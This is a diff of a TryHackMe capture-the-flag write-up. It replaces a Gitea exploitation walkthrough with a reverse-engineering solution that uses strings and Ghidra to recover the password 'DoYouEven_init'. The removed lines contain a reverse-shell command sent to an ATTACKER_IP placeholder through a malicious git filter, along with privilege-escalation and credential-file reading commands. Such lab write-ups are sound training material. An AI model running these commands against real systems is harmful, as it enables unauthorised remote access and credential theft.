@@ -4,91 +4,98 @@
 |---|---|
 | **Platform** | TryHackMe |
 | **Room** | [Compiled](https://tryhackme.com/room/compiled) |
-| **Difficulty** | 🟡 Medium |
-| **Category** | Web, Git |
-| **OS** | Linux |
-| **Tools** | nmap, git, Burp Suite |
+| **Difficulty** | 🟢 Easy |
+| **Category** | Reverse Engineering |
+| **Tools** | Ghidra, strings, file, chmod |
 
 ---
 
 ## 🎯 Objective
 
-Exploit a self-hosted Gitea instance running a vulnerable version to achieve Remote Code Execution.
+A compiled binary is provided — reverse engineer it to find the correct password and capture the flag.
 
 ---
 
-## 🔍 Reconnaissance
+## 🔍 Initial Analysis
+
+Download the task file. Check what kind of file it is:
 
 ```bash
-nmap -sC -sV TARGET_IP
+file Compiled.Compiled
+# ELF 64-bit LSB executable, x86-64
 ```
 
-**Open ports:**
-```
-22/tcp   open  ssh
-80/tcp   open  http    Gitea
-3000/tcp open  http    Gitea
-5000/tcp open  http    application
-```
+Give it execute permissions and run it:
 
-Gitea version identified — check for known CVEs:
 ```bash
-searchsploit gitea
-# Found: Gitea — Remote Code Execution
+chmod +x Compiled.Compiled
+./Compiled.Compiled
+# Password: test
+# Try again!
+```
+
+It asks for a password. Try extracting strings first:
+
+```bash
+strings Compiled.Compiled
+```
+
+An interesting format string appears: `DoYouEven%sCTF`
+
+---
+
+## 🔬 Reverse Engineering with Ghidra
+
+Load the binary into Ghidra → Analyse → open the `main` function in the Decompiler view:
+
+```c
+undefined8 main(void) {
+    int iVar1;
+    char local_28 [32];
+    
+    fwrite("Password: ", 1, 10, stdout);
+    __isoc99_scanf("DoYouEven%sCTF", local_28);
+    
+    iVar1 = strcmp(local_28, "__dso_handle");
+    if ((-1 < iVar1) && (iVar1 = strcmp(local_28, "__dso_handle"), iVar1 < 1)) {
+        printf("Try again!");
+        return 0;
+    }
+    iVar1 = strcmp(local_28, "_init");
+    if (iVar1 == 0) {
+        printf("Correct!");
+    } else {
+        printf("Try again!");
+    }
+    return 0;
+}
 ```
 
 ---
 
-## 💥 Exploitation
+## 💥 Solution
 
-**Gitea Code Injection via Malicious Repository:**
+The `scanf` format string is `DoYouEven%sCTF` — meaning whatever we type gets inserted into `DoYouEven___CTF`. The binary then checks if `local_28` equals `_init`.
 
-Gitea processes repository contents including `.gitattributes`. By creating a repository with a malicious configuration file, arbitrary commands can be executed on the server.
-
-```bash
-# Create repo locally
-git init malicious-repo
-cd malicious-repo
-
-# Create malicious .gitattributes
-echo '*.c filter=indent' > .gitattributes
-git config filter.indent.clean 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'
-
-# Commit and push to Gitea
-git add .
-git commit -m "initial"
-git remote add origin http://TARGET_IP:3000/user/malicious-repo.git
-git push -u origin main
+So the full input needed is:
+```
+DoYouEven_init
 ```
 
-When the repository is processed — shell is received.
-
----
-
-## 🔐 Privilege Escalation
-
 ```bash
-# Check for SUID binaries
-find / -perm -4000 2>/dev/null
-
-# Check sudo
-sudo -l
-
-# Check running processes
-ps aux
-# Gitea running as specific user — check its config
-cat /etc/gitea/app.ini
-# Database credentials often found here
+./Compiled.Compiled
+# Password: DoYouEven_init
+# Correct! Enjoy Decompiling! (--;)
 ```
 
 ---
 
 ## 📚 Lessons Learned
 
-- Self-hosted Git services (Gitea, Gogs, GitLab) should always be kept up to date
-- Repository processing can execute code — treat git hooks and attributes as code
-- Application config files often contain database credentials — check `/etc/` directories
-- Source code review of running applications is a valuable recon technique
+- `strings` is always the first step on an unknown binary — reveals format strings, hardcoded values, and hints
+- Ghidra decompiles machine code back into readable C — essential for reverse engineering
+- Custom `scanf` format strings can act as implicit password prefixes/suffixes
+- Always check `file` before executing an unknown binary
 
 ---
 *by OwlRC 🦉 | github.com/OwlRC*
